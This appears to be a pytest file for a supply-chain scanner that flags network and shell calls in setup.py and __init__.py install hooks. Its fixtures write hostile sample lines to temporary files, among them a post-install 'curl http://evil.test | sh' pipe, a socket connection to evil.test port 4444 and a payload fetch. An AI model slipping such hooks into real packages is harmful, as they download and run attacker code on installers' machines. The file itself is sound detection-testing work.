"""Tests for analysis/install_hook_scanner.py."""

from __future__ import annotations

from pathlib import Path

from nidhogg.analysis.install_hook_scanner import scan_install_hooks
from nidhogg.core.models import InstallHookSource


def test_scan_detects_subprocess_at_module_level_in_setup_py(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
    )

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].call == "subprocess.Popen"
    assert result[0].command == "subprocess.Popen(['curl', 'http://evil.test'])"
    assert result[0].context == "module"
    assert result[0].source is InstallHookSource.SETUP_PY
    assert result[0].lineno == 2


def test_scan_detects_os_system_inside_cmdclass_method(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import os\n"
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "\n"
        "class PostInstall(install):\n"
        "    def run(self):\n"
        "        os.system('curl http://evil.test | sh')\n"
        "        install.run(self)\n"
        "\n"
        "setup(name='pkg', cmdclass={'install': PostInstall})\n"
    )

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].call == "os.system"
    assert result[0].command == "os.system('curl http://evil.test | sh')"
    assert result[0].context == "PostInstall.run"
    assert result[0].source is InstallHookSource.SETUP_PY


def test_scan_detects_socket_in_init_py(tmp_path: Path) -> None:
    (tmp_path / "__init__.py").write_text(
        "import socket\nsocket.create_connection(('evil.test', 4444))\n"
    )

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].call == "socket.create_connection"
    assert result[0].command == "socket.create_connection(('evil.test', 4444))"
    assert result[0].source is InstallHookSource.PACKAGE_INIT


def test_scan_detects_urllib_request_in_nested_init_py(tmp_path: Path) -> None:
    sub = tmp_path / "pkg" / "sub"
    sub.mkdir(parents=True)
    (sub / "__init__.py").write_text(
        "import urllib.request\nurllib.request.urlopen('http://evil.test/payload')\n"
    )

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].call == "urllib.request.urlopen"
    assert result[0].command == "urllib.request.urlopen('http://evil.test/payload')"
    assert result[0].filepath == sub / "__init__.py"


def test_scan_command_includes_full_arguments_and_kwargs(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import subprocess\n"
        "url = 'http://evil.test/payload'\n"
        "subprocess.run(['curl', url], shell=True, check=False)\n"
    )

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].call == "subprocess.run"
    assert (
        result[0].command
        == "subprocess.run(['curl', url], shell=True, check=False)"
    )


def test_scan_ignores_benign_call(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text("print('hello')\n")

    result = scan_install_hooks(tmp_path)

    assert result == []


def test_scan_ignores_python_file_that_is_not_setup_or_init(tmp_path: Path) -> None:
    (tmp_path / "helper.py").write_text("import subprocess\nsubprocess.run(['ls'])\n")

    result = scan_install_hooks(tmp_path)

    assert result == []


def test_scan_skips_file_with_syntax_error(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text("def broken(:\n    pass\n")

    result = scan_install_hooks(tmp_path)

    assert result == []


def test_scan_detects_subprocess_in_nested_setup_py_sdist_wrapper_dir(
    tmp_path: Path,
) -> None:
    wrapper = tmp_path / "pkg-1.0"
    wrapper.mkdir()
    (wrapper / "setup.py").write_text(
        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
    )

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].call == "subprocess.Popen"
    assert result[0].source is InstallHookSource.SETUP_PY
    assert result[0].filepath == wrapper / "setup.py"


def test_scan_no_setup_py_only_scans_init_py(tmp_path: Path) -> None:
    (tmp_path / "__init__.py").write_text("import subprocess\nsubprocess.run(['ls'])\n")

    result = scan_install_hooks(tmp_path)

    assert len(result) == 1
    assert result[0].source is InstallHookSource.PACKAGE_INIT
